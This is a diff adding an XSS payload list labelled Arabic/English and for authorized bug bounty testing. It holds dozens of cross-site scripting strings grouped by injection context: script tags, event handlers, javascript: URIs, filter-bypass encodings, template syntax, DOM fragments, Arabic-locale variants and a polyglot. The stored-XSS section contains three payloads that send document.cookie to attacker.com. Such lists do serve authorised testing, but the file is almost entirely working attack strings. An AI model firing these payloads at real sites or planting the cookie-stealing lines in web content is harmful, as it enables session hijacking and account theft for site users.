@@ -1,0 +1,72 @@
+# XSS Payloads — Arabic/English
+# For authorized bug bounty testing only
+
+# ── Basic Reflected XSS ──────────────────────────────────────
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</title><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</style><script>alert(1)</script>
+
+# ── Event-based (no script tags) ─────────────────────────────
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.cookie)>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<svg><animate onbegin=alert(1)>
+<body onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+
+# ── JavaScript URI ────────────────────────────────────────────
+javascript:alert(1)
+javascript:alert(document.cookie)
+javascript:confirm(1)
+javascript:prompt(1)
+
+# ── HTML Entities / Encoding Bypass ──────────────────────────
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<SCRIPT>alert(1)</SCRIPT>
+<ScRiPt>alert(1)</sCrIpT>
+
+# ── Attribute Context ─────────────────────────────────────────
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+" autofocus onfocus="alert(1)
+"><svg/onload=alert(1)//
+
+# ── Template Injection (XSS-adjacent) ────────────────────────
+{{alert(1)}}
+${alert(1)}
+<%= alert(1) %>
+#{alert(1)}
+
+# ── DOM-based ─────────────────────────────────────────────────
+#<script>alert(1)</script>
+#"><script>alert(1)</script>
+?xss=<script>alert(1)</script>
+&xss=<script>alert(1)</script>
+
+# ── Stored XSS (form payloads) ───────────────────────────────
+<script>fetch('https://attacker.com/?c='+document.cookie)</script>
+<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
+<svg><script>fetch('https://attacker.com/?c='+document.cookie)</script></svg>
+
+# ── Arabic locale XSS ────────────────────────────────────────
+<script>alert('اختبار XSS')</script>
+"><script>alert('اختبار')</script>
+مرحبا<script>alert(1)</script>
+
+# ── Polyglot ─────────────────────────────────────────────────
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
